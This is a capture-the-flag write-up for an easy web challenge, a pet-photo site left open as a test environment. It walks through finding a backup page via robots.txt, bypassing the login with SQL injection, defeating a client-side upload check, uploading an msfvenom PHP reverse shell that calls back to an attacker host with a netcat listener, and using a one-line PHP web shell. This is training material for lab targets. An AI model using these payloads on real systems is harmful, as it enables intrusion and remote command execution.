### Difficulty and Points

easy;

### Description

The cat lady in the neighborhood develops a website to exchange picz of her precious pets. She accidentally opend her test environment to the public. Garfilds portraits are secure though, she says.

### Hints (and price in percent of possible points)

1. What web pages can you access? (10 %)
2. Is the login securely implemented? (15 %)
3. You can only upload images! Do you? (25 %)

### Solution tl;dr

- Look which pages are accessible. Hint: robots.txt -> index.php.bak -> login.php
- User: `asdf' or 1=1--`
- Circumvent JavaScript mime type check
- Upload a .php file, like one created using:
  `msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw -o phpreverseshell.php`
  `msfvenom -p php/reverse_php LHOST=192.168.42.181 LPORT=4444 -f raw -o phpreverseshell.php`
- `nc -l -p 4444`
- `cat /DS-*`

### Writeup

- You are provided with an IP <IP> to the web app.
- At a first glace the web app isn't functional yet.
- Let's try to find some hidden pages the developer already uploaded, but didn't make public.
- We can automate the search using nikto or dirb, but lets poke around manually for now.
- A great way to get an overview of a website is to check <IP>/sitemap.xml or <IP>/robots.txt.
- No luck with the former, but we have a hit with the later.
- This gives us the hint that a crawler shouldn't cache *.bak files. Maybe the developer uses this extention for versioning?
- Let's try the most obvious <IP>/index.html.bak. No luck. Now, <IP>/index.php.bak. Jackpot!
- It wants us to redirect to login.php. Now we're talkin'!
- Let's check if the login is vulnerable to sql injections by typing in random shit as username and password each followed by a single quote char.
- Whoops. Something went wrong there.
- Either we get out the big guns now, i.e. sqlmap. Oooorrrr, we play a bit around.
- Let's try the oldest trick in the book: `asdf' or 1=1--` as user and random shit as password. And - BAAAMMm - we are in. Seems the cat lady wasn't the smartest in coding class.
- Finally, we can upload our favorite kitty pic. But wait... can't we upload some php as well?
- Nope. The upload button magically dissapears. Mhhh, was that a rechest to the server already??? I don't think so!
- Let's check the source for JavaScript.
- Using my favorite browser, Firefox - obviously! -, pressing strl+shift+i opens the developer tools.
- Searching for "IMAGE FILES ONLY" in the source reveals, the button.style.visibility is set to "hidden". But we don't want that. Let's change it to "visible". Et voil√†! We can upload .php files now.
### 1.
- I'm too lazy to write php myself... so I just generate my webshell using Metasploits msfvenom:
    - Syntax: `msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw -o phpreverseshell.php`
    - Note: I own the domain example.org and I have a port forwarding set up to my local machine on tcp 4444.
    - Which makes the cmd: `msfvenom -p php/reverse_php LHOST=example.org LPORT=4444 -f raw -o phpreverseshell.php`
- Opening a listener with netcat ... `nc -l -p 4444`
- ... uploading phpreverseshell.php ...
- ... I get my secure kitty link <IP>/upload/0ffc7b...c9b6d.php
- ... and opening it in the browser, gives me my hoped for shell.
- Note: Using a reverse shell circumvents server side firewalling. However, it seems there is none. So, the same shit flies using a bind shell.
- Let's look around a bit, shell we? (pun intended)
    - `whoami` ... so far so expected.
    - `ls -al /` ... wait... what??? What do we have here? Can we read the token already? Yes, we can!
    - `cat /DS-token`
### 2.
- I don't need a reverse shell! I'll just use my trusty browser and the developer tools.
  - After uploading an example image I found out that I can just resend the packet with different Content!
  - So this time I'm just gonna change "filename=example.png" to "filename=example.php", and "Content-Type: image/png" with "Content-Type: text/html" 
  - And replacing the Image data with `<?php echo shell_exec($_GET['cmd']); ?>`
- Nice! When following the link of the Image we can now put a Querystring behind in the browser to execute commands!
- For example `filename.php?cmd=ls`
- Let's look around a bit, shell we? (pun intended)
    - `whoami` ... so far so expected.
    - `ls -al /` ... wait... what??? What do we have here? Can we read the token already? Yes, we can!
    - `cat /DS-token`
